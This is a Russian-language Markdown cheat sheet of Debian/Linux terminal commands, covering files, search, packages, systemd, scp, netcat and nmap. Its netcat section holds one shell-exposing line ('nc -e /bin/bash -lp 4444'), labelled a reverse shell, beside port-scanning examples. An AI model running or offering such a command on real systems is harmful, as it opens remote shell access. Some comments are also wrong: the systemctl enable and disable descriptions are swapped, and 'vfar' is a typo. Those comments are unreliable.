# LINUX | DEBIAN 9

[настройка debian 9 после установки](https://losst.ru/nastrojka-debian-9-posle-ustanovki)

## Базовые команды терминала
![BASH](/img/bashmini.webp)

#### Вызвать справку по команде

	[команда] --help
	man [команда]

[горячие клавиши в шелле](https://habr.com/ru/post/99843/)

#### Система

	sudo [команда]    # выполнить команду от имени Императора

Чтобы работала команда sudo необходимо пользователя добавить в группу sudo    

    su
    usermod -aG sudo <имя пользователя>

    env               # вывод переменных окружения задаются в ~/.profile
    uname -a          # вывод информации об операционной системе
    which [команда]   # вывод местонахожения исходного файла команды
    whereis [команда] # подробный вывод which
    inxi -b           # общая информация о системе
    cat /proc/cpuinfo # подробная информация о процессоре
    cat /proc/meminfo # подробная информация о памяти
    cat /proc/loadavg # средняя загрузка процессора

#### Управление пользователями

    whoami      # вывести имя текущего пользователя

    users       # список пользователей системы
    useradd     # добавить пользователя
    userdel     # удалить пользователя
    usermod     # изменить конфигурацию пользователя (группы, имя, домашнюю папку)

    groups      # список групп к которых состоит пользователь
    compgen -g  # список всех групп
    groupadd    # добавить группу
    groupdel    # удалить групп
    groupmod    # изменить конфигурацию группы

    chown       # изменение владельца и группы на файлы и директории
    chmod       # изменение прав на файлы и директории

[Права доступа linux](http://www.k-max.name/linux/prava-dostupa-v-linux-eshhe-odna-malenkaya-shpargalka/)
	
#### Аргументы предыдущих команд

	!! — предыдущая команда
	!^ — первый аргумент предыдущей команды
	!$ — последний аргумент предыдущей команды
	!* — все аргументы предыдущей команды
	!-2 — вторая с конца команда
	
#### Выполнять команду, не блокируя терминал

    [команда] &
    [команда] & disown # и отсоединить от сессии терминала
	nohup [команда] & disown # писать весь вывод в файл nohup.out чтоб не засорять терминал

[утилита start-stop-daemon](http://help.ubuntu.ru/wiki/start-stop-daemon)
	
#### Вывод нескольких команд

	[команда1]; [команда2]; [команда3]; ...
	
#### Выполнение нескольких команд и условие на завершение предыдущей команды

    [команда1] && [команда2] # команда2 выполнится только после успешного завершения команды1
	[команда1] || [команда2] # команда2 выполнится только после неудачного завершения команды1

#### Управление дисковым пространством

    df                              # общая информация по всем разделам
    sudo fdisk -l                   # информация об установленных внешних носителях
    sudo mkfs -t vfar /dev/sdb1     # форматирование носителя
    udisksctl mount -b /dev/sdc1    # автоматическое монтирование носителя
    sudo mount /dev/sda /mnt/local  # монтирование устройства /dev/sda в ранее созданную папку /mnt/local

[fstab файл автомонтирования устройств](https://itshaman.ru/articles/13/fstab-linux)

#### Посмтореть дерево каталогов

    tree        # вывести дерево каталогов от текующего
    tree -L 2   # ограничить дерево двумя вложениями

#### Посмотреть размер файлов

    du      # выведет список с размерами файлов и папок в каталоге и подкаталоге
    du -d 1 # аргумент -d задает глубину поиска. -d 1 отобразить размеры файлов и папок только в текущей папке.


#### Перейти в папку

	cd [DIRECTORY]
	сd /           # перейти в корень
	cd ~           # перейти в домашнюю деректорию
	cd -           # перейти в предыдущию директорию
    pwd            # выводит текщую дерикторию
    .              # аргумент текущей директории для команд например `echo .` покажет тоже что и `pwd`
    --parents      # скопировать файл вместе со структурой папок

#### Посмотреть содержимое каталога

    ls [DIRECTORY]
    ls -l          # подробная информация
    ls -a          # показать скрытые файлы
    ls -la         # поробный вывод вместе со скрытми файлами

#### Скопировать файл

	cp [OPTION] SOURCE DESTINATION
	cp ~/test.c peretest.c 	# скопировать из домашней директории файл test.c в текущию дерикторию с названием "peretest.c"
	cp -r docs doc          # скопировать файлы в папке docs в папку doc
	cp * ../                # скопировать все файлы в текущей директории в предыдущую папку
	cp /home/sample.txt{,-old} # если вам нужно быстро переименовать или переместить множество файлов с суффиксами
	cp /home/sample.txt /home/sample.txt-old # вот как её можно расшифровать
Переместить файл

	mv [OPTION] SOURCE DESTINATION
	mv test.c main.c # изменить имя файла
	mv test.c main/test.c # переместить файл test.c в папку main
	
#### Переименовывание файлов в пакетном режиме

	rename 's/[что заменить]/[на что заменить]/' *.[тип файла, если нужно оставить неизменным]

#### Создание файлов
	
	touch [файл] #создать пустой файл
	touch file{1..9} # создать 9 файлов с именами file1, file2 ...
	> [файл] # создать файл или очистить файл без его удаления
	dd if=/dev/zero of=out.txt bs=1M count=10 # создание файла заданного размера, с последовательным заполнением всех байтов нулями
    truncate -s <размер>                      # быстрое создание файла
[работа с командой dd](https://habrahabr.ru/post/117050/)

#### Чтение файлов

    cat [файл] # простой вывод файла
    zcat       # та же команда для архива
    
    more [файл] # постраничный вывод файла
    less [файл] # умный вывод файла
    zless       # та же команда для архива
    
    head -50 [файл] # чтение первых 50 строк
    tail -50 [файл] # прочитать 50 строк с конца
    # Чтение лог-файлов в режиме реального времени
    tail -f [файл]
    tail -f [файл] | grep [строка поиска] # вывод только определенных строк

[Знакомство с текстовыми утилитами UNIX](https://www.ibm.com/developerworks/ru/library/au-unixtext/index.html)

#### Поиск файлов

[Команда find и её опции в примерах](https://rtfm.co.ua/komanda-find-i-eyo-opcii-v-primerax/)

	find [папка поиска] -name "имя файла"
    -iname "имя файла"         # нечувствительный к регистру поиск
    -path "имя папки"          # фильтрация по названию папки
    -ipath "имя папки"         # нечувствительный к регистру названия папок
    -regex "выражение"         # поиск по регулярному выражению
    -regextype "тип"           # выбор типа регулярного выражения по умолчанию emacs
               ‘emacs’ Regular expressions compatible with GNU Emacs; this is also the default behaviour if this option is not used. 
               ‘posix-awk’ Regular expressions compatible with the POSIX awk command (not GNU awk) 
               ‘posix-basic’ POSIX Basic Regular Expressions. 
               ‘posix-egrep’ Regular expressions compatible with the POSIX egrep command 
               ‘posix-extended’ POSIX Extended Regular Expressions
               ‘posix-minimal-basic’
               ‘awk’
               ‘findutils-default’
               ‘egrep’
               ‘ed’
               ‘gnu-awk’
               ‘grep’
               ‘sed’

Если требуется складывать одинаковые фильтры используем флаг -o

    find . -name "имя файла" -o -name "имя файла" -o -name "имя файла"

Если требуется исключить какой то фильтр то используем !

    find . -name "regex1" ! - name "regex2"

Найти и удалить файлы

    find / -name .DS_Store -print0 | xargs -0 rm

[Расширенные возможности использования команды find в UNIX](https://www.ibm.com/developerworks/ru/library/au-unix-find/index.html)
	
#### Поиск в файле

	grep "строка поиска" [файл]
	zgrep          # та же команда для архивов
	-r             # рекурсивный поиск по папкам
	-n             # вывод номера строки в файле
    -B [кол-во]    # вывод строк до искомой строки
    -A [кол-во]    # вывод строк после искмой строки
    -o             # вывод только искоого выражения 
	-i	           # отключение чувствительности к регистру
	-w	           # поиск только целых слов
	-c	           # вконце покажет количесво выведнных строк
	-v	           # исключить строки
    -C             # [кол-во] вывод контекстных строк
    -L             # вывод имен файлов а не искомые строки

    grep -Pri [строка поиска] [путь] # узнать, имеются ли в некоей директории файлы, которые содержат определённый текст

    ls | grep file # поиск в выводе комады ls

[Что такое grep и с чем его едят](https://habrahabr.ru/post/229501/)

#### Поиск драйверов

Если при apt upgrade выводится `W: Possible missing firmware /lib/firmware/rtl_nic/rtl8107e-2.fw for module r8169` то нужный драйвер можно найти командой `apt-file`

    apt-file find rtl8107e # покажет все пакеты где встречается такой файл

#### Преобразование текста
    
    echo "Строка" | sed 's/к/ф/'       # заменяет букву `к` на `ф`
    cat file | sed '/^#/d'             # удалить все строки начинающиеся с `#`
    cat file | sed '/^\s*$/d'          # удалить все пустые строки

[Одно-строчные скрипты SED](http://ant0.ru/sed1line.html)

#### Сортировка

    sort
    -r в обратном алфавиту порядке
    -n используется всегда, когда нужно сортировать числа
    -k позволяет задавать объект сортировки: все эти столбцы, колонки, и тому подобные элементы форматирования файла.

Пример

    sort -nrk 2 debts.txt
    Taras:  500$ -- June      24 2008
    Vova:   100$ -- September 3  2008
    Misha:  25$  -- May       12 2008
    Sergey: 10$  -- December  30 2008

#### Фильтрация повторяющихся строк
    
__Работает только с отсортированными строками__

    uniq
    -u Выводить только те строки, которые не повторяются на входе.
    -d Выводить только те строки, которые повторяются на входе.
    -c Перед каждой строкой выводить число повторений этой строки на входе и один пробел.
    -i Сравнивать строки без учёта регистра.
    -s число_символов
    Игнорировать при сравнении первые число_символов символов каждой строки ввода. Если эта опция указана совместно с -f, то будут игнорироваться первые число_полей полей, а затем ещё число_символов символов. Символы также нумеруются начиная с единицы.
    -f число_полей
    Игнорировать при сравнении первые число_полей полей каждой строки ввода. Полем является строка непробельных символов, отделённая от соседних полей пробельными символами. Поля нумеруются начиная с единицы.

#### Посмотреть прогресс выполнения команды

	progress
	-w # показывает время выполнения команды
	-q # упрощенный вывод
	-d # дополнительная информация
	-m # отслеживать в реальном времени
	watch progress # тоже самое что -m

#### Управление пакетами

Установка deb пакетов производится с помощью программы dpkg

    sudo dpkg -i <имя пакета>
    sudo apt-get -f install   # после установки deb установить зависимости этого пакета

Либо с помощью графической утилиты gdebi

    sudo apt-get install [имя пакета] # установить пакет
    sudo apt-get remove [имя пакета]  # удалить пакет
    sudo apt-get update               # обновить данные репозитория
    sudo apt-get upgrade              # обновить ПО
    sudo apt-cache search [фраза]     # поиск по репозиторию
    sudo apt-cache search [имя пакета]# просмотр информации по пакету
    dpkg --get-selections | grep -v "deinstall" #просмотр установленных пакетов

[Управление репозиториями](https://wiki.debian.org/ru/SourcesList)

#### Управление программами

	ps aux               # вывести все запущенные процессы на этом пк
	kill [pid] or [name] #остановить процесс по его имени или номеру

#### Управление сервисами

Debian с версии 8 работает на [systemd](https://wiki.debian.org/systemd) поэтому пользуемся командой systemctl, старые команды, 
такие как `service`, `/etc/init.d/[service]` и т.п. остались для совместимости, но используют в итоге systemctl

    systemctl list-units # просмотр unitов
        --type service   # отфильтровать по типу сервисы
        --state running  # отфильтровать только по работающим
        --state failed   # которые завершились с ошибкой
        -all             # показать всё
    systemctl list-unit-files # посмотреть файлы конфигураций
        --type service        # отфильтровать по типу сервисы
        --state enabled       # по включенным в автозагрузку
        --state disabled      # отключенные
        --state masked        # скрытые
        --state static        # которые нельзя отключить
    systemctl list-unit-files --type service --state enabled # просмотр сервисов в автозагрузке
    sudo systemctl stop    [имя сервиса].service # остановка сервиса
    sudo systemctl start   [имя сервиса].service # запуск сервиса
    sudo systemctl restart [имя сервиса].service # перезапуск сервиса
    sudo systemctl reload  [имя сервиса].service # перезапуск конфигурации
    sudo systemctl disable [имя сервиса].service # добавить сервис в автозагрузку
    sudo systemctl enable  [имя сервиса].service # удалить сервис из автозагрузки

[Управление службами linux](https://losst.ru/upravlenie-sluzhbami-linux)
[Systemd: пишем собственные .service и .target](https://habrahabr.ru/post/275645/)

#### Симуляция клавиш

    xdotool key Up # эмулирует клавишу Up

## Работа с сетью

	sudo ifconfig           # общая информаци о сетевых устройствах этого пк
	sudo netstat -tpln      # посмотреть какая программа слушает порт
    python -m CGIHTTPServer # быстро поднять http server
    sudo ip addr show       # показать все ip адреса на интерфейсе
	
[Настройка iptables для чайников](https://losst.ru/nastrojka-iptables-dlya-chajnikov)

#### SCP
Протокол над ssh для копирования файлов

    $ scp user@remote.host:file.txt /some/local/directory  # Копируем файл «file.txt» из удаленного сервера на локальный компьютер
    $ scp file.txt user@remote.host:/some/remote/directory # Копируем файл «file.txt» с локального компьютера на удаленный сервер.
    $ scp -r dir1 user@remote.host:/some/remote/directory/dir2 # Копируем папку «dir1» с локального хоста в директорию «dir2» на удаленном хосте.
        -P 2222 # меняем стандатный порт
        -p      # cохраняем время изменения и время доступа и права копируемого файла.
        -l 100  # ограничение скорости до 100 кб.с
    $ scp user@remote.host:~/\{file1,file2,file3\} . # Копируем несколько файлов с удаленного хост в текущую директорию на Вашем локальном хосте.

#### Netcat

[статья на Habrahabr](https://habrahabr.ru/company/pentestit/blog/336596/)

	nc -vn 192.168.1.100 12345       # Проверка наличия открытого TCP-порта 12345
	nc -vnz 192.168.1.100 20-24      # Сканирование TCP-портов с помощью\
	nc -vnzu 192.168.1.100 5550-5560 # Сканирование UDP-портов
	
	echo -n "foo" | nc -u -w1 192.168.1.100 161 # Отправка UDP-пакета
	nc -u localhost 7777                        # Прием сообщения на UDP-порту и вывод принятых данных
	while true; do nc -u localhost 7777; done   # Прием нескольких сообщений
	
	nc 192.168.1.100 5555 < 1.txt # Передача файла
	nc -lvp 5555 > /tmp/1.txt     # Прием прием файла
	while true; do nc -lp 8888 < index.html; done   # Netcact в роли простейшего веб-сервера
	while true; do sudo nc -lp 80 < test.html; done # Права админа для использования 80 порта
	
	nc -lp 9000           # Чат между узлами (сервер)
	nc 192.168.1.100 9000 # (клиент)
	nc -e /bin/bash -lp 4444   # Реверс шелл
	nc 192.168.1.100 4444      # клиент
	
Справка в debian находится по пути `/usr/share/doc/netcat-traditional/`

#### Nmap

[статья на Habrahabr](https://habrahabr.ru/post/131433/)
[официальный man](https://nmap.org/man/ru/)
[Первое знакомство с инструментом Nmap](https://www.ibm.com/developerworks/ru/library/aix/getting-started-with-nmap-for-sys-admin/index.html)

	nmap scanme.nmap.org # сканирование откртых портов по умолчанию первые 1024
	
Open означает, что приложение на целевой машине готово для принятия пакетов на этот порт. Filtered означает, что брандмауэр, фильтр, или что-то другое в сети блокирует порт, так что Nmap не может определить, является ли порт открытым или закрытым. Closed — не связанны в данный момент ни с каким приложением, но могут быть открыты в любой момент. Unfiltered порты отвечают на запросы Nmap, но нельзя определить, являются ли они открытыми или закрытыми.

	nmap -sV example.com # определение софта на открытых портах
	
	nmap -O example.com # примерно определить ОС
	
	nmap -A scanme.nmap.org # запустить все возможные тесты одновременно
	
	nmap -sP 192.168.1.0/24 # проверка на доступность адресов локальной сети с маской
	sudo nmap -sP 192.168.1.0/24 # выведет еще и mac адреса
	
	-sS — посылать только syn и считать порт открытым если получен syn_ack 
	-p- — сканировать все 65 тысяч портов, потому как по дефолту сканируются только 1024
	-PS80,22 — принимать решение о том что хост онлайн не на основании icmp echo, а на основании доступности tcp-порта
	-n — не делать DNS-резолв, типа выяснения PTR записей и прочего
	-T4 — большая скорость, маленькие тайминги (если канал у цели и себя быстрый)
	-vvv — максимум verbosity, так найденные порты будут показаны по ходу сканирования а не после завершения
	--reason — показывать почему было принято решение о таком состоянии порта

[Сканирование сети](https://www.ibm.com/developerworks/ru/library/au-satnetworkscan/index.html)

## Полезные ссылки по работе с терминалом LINUX
- [10 приёмов работы в терминале Linux, о которых мало кто знает](https://habrahabr.ru/company/ruvds/blog/336060/)
- [Самые полезные приёмы работы в командной строке Linux](https://habrahabr.ru/company/ruvds/blog/323330/)
- [20 приёмов работы в командной строке Linux, которые сэкономят уйму времени](https://habrahabr.ru/company/ruvds/blog/339820/)
- [Linux: перенаправление](https://habrahabr.ru/company/ruvds/blog/336320/)
- [Удивительно полезный инструмент: lsof](https://habrahabr.ru/company/ruvds/blog/337934/)
- [PDF-версия статей про Bash-скрипты](https://habrahabr.ru/company/ruvds/blog/336764/)
- [Немного предпятничных задачек на Bash](https://habrahabr.ru/post/339246/)
- [Оболочка Bash — шпаргалка для начинающих](https://tproger.ru/translations/bash-cheatsheet/)
- [Основные команды Bash](http://it-news.club/basic-commands-in-bash/)
- [15 малоизвестных команд Linux](https://habrahabr.ru/post/228999/)
- [Горячие клавиши в шелле](https://habrahabr.ru/post/99843/)
- [How to: Change / Setup bash custom prompt (PS1)](https://www.cyberciti.biz/tips/howto-linux-unix-bash-shell-setup-prompt.html)
- [Удивительно полезный инструмент: lsof](https://habrahabr.ru/company/ruvds/blog/337934/)
- [Первые шаги по настройке и использованию SSH](https://www.ibm.com/developerworks/ru/library/au-sshsecurity/)
- [Три замка на воротах SSH](https://www.ibm.com/developerworks/ru/library/au-sshlocks/index.html)
- [Как получить максимальный эффект от sudo](https://www.ibm.com/developerworks/ru/library/au-sudo/index.html)
- [Изучаем Vim](https://www.ibm.com/developerworks/ru/library/au-speakingunix_vim/index.html)
- [Распределенная компиляция](https://www.ibm.com/developerworks/ru/library/au-dist_comp/index.html)
- [Параметры bash и расширения параметров](https://www.ibm.com/developerworks/ru/library/l-bash-parameters/index.html)
- [Регулярные выражения](https://www.ibm.com/developerworks/ru/library/au-regexp/index.html)
- [Регулярные выражения 2](https://www.ibm.com/developerworks/ru/library/au-speakingunix9/index.html)
- [Улучшите ваши навыки создания шаблонов регулярных выражений](https://www.ibm.com/developerworks/ru/library/au-expressions/index.html)
- [Эффективная работа с BASH](https://www.ibm.com/developerworks/ru/library/au-speakingunix2/index.html)
- [Автоматизация UNIX](https://www.ibm.com/developerworks/ru/library/au-speakingunix6/index.html)
- [Работа с командной строкой](https://www.ibm.com/developerworks/ru/library/au-speakingunix7/index.html)
- [Управление процессами в UNIX](https://www.ibm.com/developerworks/ru/library/au-speakingunix8/index.html)
- [Устройство файловой системы UNIX](https://www.ibm.com/developerworks/ru/library/au-speakingunix11/index.html)
- [Эффективное использование rsync](https://www.ibm.com/developerworks/ru/library/au-spunix_rsync/index.html)
- [Анализ производительности сети в UNIX](https://www.ibm.com/developerworks/ru/library/au-networkperfanalysis/index.html)
- [подробный мануал по make](http://rus-linux.net/nlib.php?name=/MyLDP/algol/gnu_make/gnu_make_3-79_russian_manual.html)
- [Изучаем процессы в Linux](https://habr.com/post/423049/)
- [Настройка Sudoers](http://blog.sedicomm.com/2018/03/21/poleznye-nastrojki-sudoers-dlya-sudo-v-linux/)
- [Твики для Firefox под linux](https://wiki.archlinux.org/index.php/Firefox/Tweaks)
- [Стандарт структуры иерархии папок в LINUX](http://refspecs.linuxfoundation.org/FHS_3.0/fhs/index.html)